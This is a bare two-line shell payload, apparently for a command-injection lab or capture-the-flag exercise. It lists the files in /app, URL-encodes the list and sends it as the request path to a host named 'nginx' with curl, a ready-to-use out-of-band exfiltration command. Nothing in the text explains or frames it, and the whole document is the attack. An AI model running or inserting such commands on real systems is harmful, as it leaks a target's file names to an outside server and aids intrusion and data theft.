a=$(ls /app/ | paste -s -d' ' | sed 's/ /%20/g')
curl http://nginx/$a